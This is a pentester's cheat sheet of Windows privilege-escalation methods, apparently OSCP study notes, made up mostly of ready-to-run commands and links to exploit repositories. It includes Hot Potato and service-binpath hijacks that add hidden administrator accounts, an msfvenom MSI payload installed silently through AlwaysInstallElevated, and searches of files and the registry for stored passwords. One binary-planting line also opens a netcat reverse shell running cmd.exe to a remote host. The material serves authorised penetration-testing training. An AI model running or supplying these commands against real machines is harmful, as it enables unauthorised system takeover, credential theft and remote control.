THIS FILE IS ABOUT WINDOWS PRIV-ESC WITH DIFFERENT METHODS 
Command | Description - SRC =https://paper.dropbox.com/doc/OSCP-Methodology-EnVX7VSiNGZ2K2QxCZD7Q 
------------------
https://github.com/LennonCMJ/pentest_script/blob/master/WindowsPE.md 

# Run the famous JollyKatz enumeration script. Work through the results. 
I prefer this as it’s not as much of a information overload as the other enumeration scripts.
===========================
http://rynudus.blogspot.com/2011/10/sql-ninja.html
        
# Does it run SQL?
============================
tasklist /fi "USERNAME ne NT AUTHORITY\SYSTEM" /fi "STATUS eq running"

# Any services running as SYSTEM?
===========================
$username = 'user' 
$password = 'password' 

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force 

$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword 

Start-Process <your evil bizz here> -Credential $credential 

# Powershell script to run-as
===============================
\\REMOTE_HOST\SYSVOL\REMOTE_HOST\Policies\{POLICY_ID}\Machine\Preferences\ 
The following configuration files may be present: 

- Services\Services.xml 
- ScheduledTasks\ScheduledTasks.xml 
- Printers\Printers.xml 
- Drives\Drives.xml 
- DataSources\DataSources.xml

# If Windows > 2008 check the Group Policy Preferences.
https://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html  
==============================
Potato.exe -ip 127.0.0.1 -cmd "net user tater Winter2016 /add && net localgroup administrators tater /add" -disable_exhaust true

# Check if the hot potato exploit can be used.

https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075

https://github.com/breenmachine/RottenPotatoNG
==================================
wmic service get 
name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """ 

icacls "C:\Program Files (x86)\Privacyware"

# Check to exploit trusted service paths. 
1. List all unquoted service paths.
2- Check folder permissions on results. Look for M (modify) or W (write) for current user. 
====================================
Check:
accesschk.exe -uwcqv  "Authenticated Users" c:\*  /accepteula 

accesschk.exe -qwsu "Authenticated Users" c:\*

sc qc <SERVICE_NAME>

Exploit:
sc config upnphost  binpath= "net localgroup Administrators backdoora /add" depend= "" 

sc config upnphost  obj= ".\LocalSystem" password= ""  
binpath= "net localgroup Administrators backdoora /add" 

sc config upnphost  obj= ".\LocalSystem" password= "" 

# Check to exploit vulnerable services. Accesscheck will determine which service bin paths can be modified.

Then we can use sc qc to determine the properties, you want to look for the following listed below.
Look for:

- SERVICE_CHANGE_CONFIG 
- SERVICE_ALL_ACCESS 
- GENERIC_WRITE 
- GENERIC_ALL 
- WRITE_DAC 
- WRITE_OWNER 

https://www.gracefulsecurity.com/privesc-insecure-service-permissions/ 
https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-windows-services-all-roads-lead-to-system-whitepaper.pdf
============================
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi

msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
        
# Is always elevated installations enabled on the server? We can exploit that.

First check the registry, both must be set to 1.

Use MSFvenom to create msi exploit. 
=============================
for %a in ("%path:;=";"%") do accesschk.exe  /accepteula -dqv "%~a"

# %PATH% exploit.
============================
/ What system are we connected to? 
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" 
// Get the hostname and username (if available) 
hostname 
echo %username% 
// Get users 
net users 
net user [username] 
// Networking stuff 
ipconfig /all 
// Printer? 
route print 
// ARP-arific 
arp -A 
// Active network connections 
netstat -ano 
// Firewall fun (Win XP SP2+ only) 
netsh firewall show state 
netsh firewall show config 
// Scheduled tasks 
schtasks /query /fo LIST /v 
// Running processes to started services 
tasklist /SVC 
net start 
// Driver madness 
DRIVERQUERY 
// WMIC fun (Win 7/8 -- XP requires admin) 
wmic /? 
# Use wmic_info script! 
// WMIC: check patch level 
wmic qfe get Caption,Description,HotFixID,InstalledOn 
// Search pathces for given patch 
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.." 
// AlwaysInstallElevated fun 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 
// Other commands to run to hopefully get what we need 
dir /s *pass* == *cred* == *vnc* == *.config* 
findstr /si password *.xml *.ini *.txt 
reg query HKLM /f password /t REG_SZ /s 
reg query HKCU /f password /t REG_SZ /s 
// Service permissions 
sc query 
sc qc [service_name] 
// Accesschk stuff 
accesschk.exe /accepteula (always do this first!!!!!) 
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!) 
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8) 
accesschk.exe -ucqv [service_name] 
// Find all weak folder permissions per drive. 
accesschk.exe -uwdqs Users c:\ 
accesschk.exe -uwdqs "Authenticated Users" c:\ 
// Find all weak file permissions per drive. 
accesschk.exe -uwqs Users c:\*.* 
accesschk.exe -uwqs "Authenticated Users" c:\*.* 
//Find services with unquoted service paths:  
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
// Binary planting 
sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe" 
sc config [service_name] obj= ".\LocalSystem" password= "" 
sc qc [service_name] (to verify!) 
net start [service_name]

# Some manual enumeration.
=====================================
http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation 

https://github.com/AusJock/Privilege-Escalation/tree/master/Windows 

https://github.com/abatchy17/WindowsExploits

# Pre-compiled windows exploits.
====================================
https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html 
http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html  

https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/ 

# Some brilliant resources if the above fails.
==================================
# OTHER WINDOWS TESTS

https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat
Comprehensive Windows privesc script that checks KBs as well as common misconfigurations
        
https://github.com/foxglovesec/RottenPotato
Local Privilege Escalation from Windows Service Accounts to SYSTEM

https://github.com/PowerShellMafia/PowerSploit
PowerSploit - A PowerShell Post-Exploitation Framework

#Other nice write-ups for windows priv-esc 
https://toshellandback.com/2015/11/24/ms-priv-esc/
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
